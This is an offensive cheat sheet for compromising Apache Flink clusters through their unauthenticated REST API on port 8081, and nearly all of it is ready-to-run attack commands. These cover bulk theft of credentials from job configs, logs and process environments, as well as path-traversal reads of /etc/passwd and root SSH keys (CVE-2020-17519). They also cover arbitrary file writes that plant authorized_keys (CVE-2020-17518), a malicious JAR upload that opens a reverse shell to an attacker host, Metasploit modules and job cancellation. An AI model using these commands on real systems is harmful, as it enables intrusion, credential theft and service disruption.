#Flink #ApacheFlink #streaming #dataengineering #RCE #enterprise

## What is Apache Flink?
Distributed stream and batch processing framework. Exposes a web dashboard and REST API on TCP 8081 — unauthenticated by default. Attackers can enumerate running jobs, read job configs (which often contain DB/cloud credentials), upload malicious JARs, and achieve RCE as the flink service account. Common in enterprise data engineering stacks alongside Kafka and Hadoop.

- Port: **TCP 8081** — Flink Web UI + REST API (no auth default)
- Port: **TCP 6123** — JobManager RPC
- Port: **TCP 6124** — Blob server
- Default install: `/opt/flink/`
- Config: `/opt/flink/conf/flink-conf.yaml`

---

## Enumeration

```bash
# Nmap
nmap -p 8081,6123,6124 -sV <target>

# Check REST API (no auth)
curl -s http://<target>:8081/overview | python3 -m json.tool
curl -s http://<target>:8081/config | python3 -m json.tool
curl -s http://<target>:8081/joboverview | python3 -m json.tool

# Version
curl -s http://<target>:8081/overview | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('flink-version',''))"

# Check web dashboard
http://<target>:8081/
```

---

## Key REST API Endpoints

```bash
# Cluster info
curl -s http://<target>:8081/overview
curl -s http://<target>:8081/config
curl -s http://<target>:8081/taskmanagers

# Jobs
curl -s http://<target>:8081/jobs
curl -s http://<target>:8081/jobs/overview
curl -s http://<target>:8081/jobs/<job_id>
curl -s http://<target>:8081/jobs/<job_id>/config      # job config — often contains creds
curl -s http://<target>:8081/jobs/<job_id>/exceptions  # errors that may reveal paths/creds

# Uploaded JARs
curl -s http://<target>:8081/jars | python3 -m json.tool

# Task managers
curl -s http://<target>:8081/taskmanagers | python3 -m json.tool
curl -s http://<target>:8081/taskmanagers/<tm_id>/log   # task manager logs
curl -s http://<target>:8081/taskmanagers/<tm_id>/stdout

# JobManager logs (often contain credentials, connection strings)
curl -s http://<target>:8081/jobmanager/log
curl -s http://<target>:8081/jobmanager/stdout
```

---

## Attack Vectors

### Credential Harvesting from Job Configs + Logs

Running Flink jobs frequently have database connection strings, cloud credentials, and API keys in their configs.

```bash
# Get all job IDs
job_ids=$(curl -s http://<target>:8081/jobs | python3 -c "import sys,json; [print(j['id']) for j in json.load(sys.stdin)['jobs']]")

# Dump config for each job (contains connection strings, credentials)
for job_id in $job_ids; do
  echo "=== Job: $job_id ==="
  curl -s "http://<target>:8081/jobs/$job_id/config" | python3 -m json.tool
done

# Check JobManager log for credentials
curl -s http://<target>:8081/jobmanager/log | grep -i "password\|secret\|key\|token\|jdbc\|connection"

# Check task manager logs
curl -s http://<target>:8081/taskmanagers | \
  python3 -c "import sys,json; [print(t['id']) for t in json.load(sys.stdin)['taskmanagers']]" | \
  while read tm; do
    echo "=== TM: $tm ==="
    curl -s "http://<target>:8081/taskmanagers/$tm/log" | grep -i "pass\|secret\|key\|jdbc"
  done
```

### CVE-2020-17519 — Path Traversal (Flink 1.11.0)

Unauthenticated path traversal via the REST API — read arbitrary files from the JobManager.

```bash
# Read /etc/passwd
curl -s "http://<target>:8081/jobmanager/logs/..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd"

# Read Flink config (connection strings, passwords)
curl -s "http://<target>:8081/jobmanager/logs/..%252F..%252F..%252Fconf%252Fflink-conf.yaml"

# Read SSH keys
curl -s "http://<target>:8081/jobmanager/logs/..%252F..%252F..%252F..%252Froot%252F.ssh%252Fid_rsa"

# Metasploit
use auxiliary/scanner/http/apache_flink_jobmanager_traversal
set RHOSTS <target>
set RPORT 8081
run
```

### CVE-2020-17518 — Arbitrary File Write (Flink 1.5.1–1.11.2)

Unauthenticated arbitrary file write via JAR upload endpoint path traversal.

```bash
# Upload a file to arbitrary path
curl -s -X POST "http://<target>:8081/jars/upload" \
  -H "Content-Type: multipart/form-data" \
  -F "jarfile=@shell.jar;filename=../../../../../../tmp/shell.jar"

# Write SSH authorized_keys
curl -s -X POST "http://<target>:8081/jars/upload" \
  -H "Content-Type: multipart/form-data" \
  -F "jarfile=@authorized_keys;filename=../../../../../../root/.ssh/authorized_keys"
```

### JAR Upload → RCE

Upload and execute a malicious JAR containing a Flink job that spawns a reverse shell.

```bash
# Step 1: Create malicious Flink JAR
# ReverseShellJob.java — a Flink StreamExecutionEnvironment job that runs bash
# Or use ysoserial approach / pre-built Flink RCE JARs from GitHub

# Step 2: Upload JAR
jar_id=$(curl -s -X POST http://<target>:8081/jars/upload \
  -H "Content-Type: multipart/form-data" \
  -F "jarfile=@rce.jar" | python3 -c "import sys,json; print(json.load(sys.stdin)['filename'].split('/')[-1])")

echo "JAR ID: $jar_id"

# Step 3: Run JAR (triggers code execution)
curl -s -X POST "http://<target>:8081/jars/$jar_id/run" \
  -H "Content-Type: application/json" \
  -d '{"entryClass":"ReverseShellJob","programArgs":"--host <attacker_ip> --port <port>"}'

# Metasploit
use exploit/multi/http/apache_flink_jar_upload_exec
set RHOSTS <target>
set RPORT 8081
set LHOST <attacker_ip>
run
```

### Dashboard Access — Job Cancellation / Manipulation

```bash
# Cancel a running job (disruption)
curl -s -X PATCH "http://<target>:8081/jobs/<job_id>" \
  -H "Content-Type: application/json" \
  -d '{"status":"CANCELED"}'

# Trigger savepoint (snapshot job state — may contain sensitive data)
curl -s -X POST "http://<target>:8081/jobs/<job_id>/savepoints" \
  -H "Content-Type: application/json" \
  -d '{"target-directory":"/tmp/savepoints","cancel-job":false}'
```

---

## Post-Exploitation

```bash
# Flink config — DB credentials, cloud keys, S3/HDFS connection strings
cat /opt/flink/conf/flink-conf.yaml
grep -i "password\|secret\|key\|fs.s3\|hadoop\|jdbc" /opt/flink/conf/flink-conf.yaml

# Flink log files
find /opt/flink/log -name "*.log" | xargs grep -i "password\|secret\|jdbc\|connection"

# Process environment — cloud credentials often injected as env vars
cat /proc/$(pgrep -f StandaloneSessionClusterEntrypoint)/environ | tr '\0' '\n' | \
  grep -i "key\|secret\|token\|pass\|aws\|azure"
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| `rest.bind-address: 0.0.0.0` (default) | REST API exposed to network |
| No `security.ssl.rest` | Unencrypted API traffic |
| No auth on REST API | Full control without credentials |
| Credentials in job configs | Exposed via `/jobs/<id>/config` |
| Unpatched Flink 1.11.x or earlier | CVE-2020-17518/17519 path traversal/file write |

---

## Quick Reference

| Goal | Command |
|---|---|
| Overview | `curl -s http://host:8081/overview` |
| List jobs | `curl -s http://host:8081/jobs` |
| Job config (creds) | `curl -s http://host:8081/jobs/<id>/config` |
| JobManager logs | `curl -s http://host:8081/jobmanager/log` |
| Path traversal (CVE-2020-17519) | `curl -s "http://host:8081/jobmanager/logs/..%252F..%252Fetc%252Fpasswd"` |
| Upload JAR | `curl -X POST http://host:8081/jars/upload -F "jarfile=@rce.jar"` |
| Run JAR | `curl -X POST "http://host:8081/jars/<id>/run" -d '{"entryClass":"..."}'` |
| MSF RCE | `exploit/multi/http/apache_flink_jar_upload_exec` |
